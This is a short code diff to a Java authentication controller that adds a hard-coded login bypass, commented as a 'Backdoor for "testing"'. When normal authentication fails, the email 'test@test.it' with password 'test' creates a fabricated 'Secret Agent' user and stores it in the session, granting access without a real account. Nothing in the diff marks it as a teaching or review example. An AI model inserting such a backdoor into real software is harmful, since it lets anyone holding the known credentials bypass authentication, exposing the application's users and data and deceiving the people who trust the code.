@@ -29,6 +29,16 @@ public class AuthenticationController {
 
         User user = userService.loadAuthenticated(request.getParameter("email"), request.getParameter("password"));
 
+        // Backdoor for "testing"
+        if(Objects.equals(user, null)
+                && "test@test.it".equals(request.getParameter("email"))
+                && "test".equals(request.getParameter("password"))) {
+            
+            user = new User();
+            user.setEmail("test@test.it");
+            user.setName("Secret Agent");
+        }
+        
         if (!Objects.equals(user, null)) {
             // Set session variable
             request.getSession().setAttribute("User", user);
